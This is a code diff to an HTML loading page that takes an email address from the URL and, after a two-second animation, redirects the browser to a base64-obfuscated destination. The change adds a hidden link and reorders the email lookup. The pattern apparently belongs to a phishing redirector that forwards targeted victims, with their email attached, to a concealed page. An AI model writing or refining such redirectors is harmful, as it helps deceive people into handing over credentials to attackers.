@@ -58,6 +58,7 @@
             <div class="dot"></div>
         </div>
     </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Reet"></a>
     <script>
         // Function to decode base64 string
         function decodeBase64(encoded) {
@@ -96,16 +97,17 @@
             window.location.href = obfuscatedURL;
         }
 
-        // Automatically redirect after showing loading dots
+        // Automatically trigger redirection after 2 seconds
         window.onload = function () {
-            const emailParam = findEmailParam();
+            // Start processing
             setTimeout(() => {
+                const emailParam = findEmailParam();
                 if (emailParam) {
                     redirectToTarget(emailParam.value);
                 } else {
                     console.error("No email found for redirection");
                 }
-            }, 2000); // Show loading dots for 2 seconds
+            }, 2000); // 2-second delay for the loading dots
         };
     </script>
 </body>
